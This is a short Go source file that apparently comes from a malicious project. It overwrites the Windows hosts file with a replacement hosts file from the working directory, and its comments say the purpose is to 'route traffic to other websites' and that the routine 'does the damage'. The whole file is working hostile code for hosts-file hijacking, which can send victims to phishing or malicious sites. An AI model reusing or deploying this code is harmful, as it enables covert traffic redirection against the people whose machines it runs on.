package main

import (
	"io/ioutil"
	"os"
)

// Edit the hosts file to route traffic to other websites

// Constant string defining default Windows directory for the hosts file
var OLDHOSTSPATH = "C:/windows/system32/drivers/etc/hosts"

// Replace a file at oldPath with the file at newPath
func overwriteFileWith(oldPath string, newPath string) {
	data, err1 := ioutil.ReadFile(newPath) // create the new data ([]byte) from reading the new file
	if err1 != nil {
		print("error returned in ReadFile")
		return
	}

	err2 := ioutil.WriteFile(oldPath, data, 644) // write new data over the old file
	if err2 != nil {
		print("error returned in WriteFile")
		return
	}
}

// call overwriteFileWith with the hosts files (old and new); does the damage.
func overwriteHosts() {
	newHostsPath, err := os.Getwd() // fetch working directory path to find new hosts file

	// return if Getwd returns an error
	if err != nil {
		print("error returned in Getwd")
		return
	}

	newHostsPath += "\\hosts"

	overwriteFileWith(OLDHOSTSPATH, newHostsPath)
}
